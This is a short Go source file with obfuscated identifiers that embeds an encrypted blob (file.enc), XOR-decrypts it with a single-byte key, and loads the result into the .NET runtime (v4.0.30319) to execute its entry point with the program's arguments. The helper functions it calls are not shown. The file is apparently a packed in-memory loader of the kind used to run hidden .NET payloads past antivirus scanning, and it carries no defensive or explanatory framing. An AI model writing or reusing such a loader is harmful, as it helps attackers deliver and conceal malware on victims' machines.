package main

import (
	_ "embed"
	"fmt"
	"os"
)

//go:embed file.enc
var _5816f9bc []byte

func main() {
	_11666973 := os.Args[1:]

	var _b5bb6ff4 []byte

	_33d9ccf0 := byte(133)

	for _0dd0a21d := 0; _0dd0a21d < len(_5816f9bc); _0dd0a21d++ {
		_b5bb6ff4 = append(_b5bb6ff4, _5816f9bc[_0dd0a21d]^_33d9ccf0)
	}
	// output, _ := LoadBin(testNet, params, "v4.0.30319", true)
	_9175f9f8, _cd916822, _ := _efd63fbb("v4.0.30319", _b5bb6ff4)
	_fec9970f := _f763b066(_9175f9f8, _cd916822)
	_7b6f1484, _ := _fec9970f.GetEntryPoint()
	_09de6353(_7b6f1484, _11666973)

	fmt.Println("Done Executing ......................")
}
